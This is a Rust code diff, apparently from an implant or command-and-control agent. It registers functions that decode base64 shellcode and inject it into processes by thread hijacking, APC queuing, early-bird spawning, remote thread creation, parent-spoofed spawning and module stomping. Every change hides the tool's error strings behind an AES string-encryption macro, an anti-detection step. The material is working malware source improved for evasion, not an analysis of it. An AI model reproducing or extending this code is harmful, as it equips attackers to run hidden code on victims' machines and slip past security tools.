@@ -10,7 +10,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_remote_hijack(pid, &shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("Hijack Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Hijack Error: "), e),
         }
     });
 
@@ -18,7 +18,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_spawn_early_bird(binary, &shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("Spawn Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Spawn Error: "), e),
         }
     });
 
@@ -27,7 +27,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_remote_apc(pid, &shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("APC Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("APC Error: "), e),
         }
     });
 
@@ -36,7 +36,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_remote_create_thread(pid, &shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("Classic Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Classic Error: "), e),
         }
     });
 
@@ -44,7 +44,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_self(&shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("Self Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Self Error: "), e),
         }
     });
 
@@ -53,7 +53,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_spawn_advanced(binary, ppid, &shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("Adv Spawn Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Adv Spawn Error: "), e),
         }
     });
 
@@ -62,7 +62,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_module_stomping(pid, dll_name, &shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("Stomp Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Stomp Error: "), e),
         }
     });
 
@@ -71,7 +71,7 @@ pub fn register(engine: &mut Engine) {
         let shellcode = BASE64.decode(b64_code).unwrap_or_default();
         match crate::agent::injection::inject_module_stomping_auto(pid, &shellcode) {
             Ok(m)  => m,
-            Err(e) => format!("Auto Stomp Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Auto Stomp Error: "), e),
         }
     });
 }
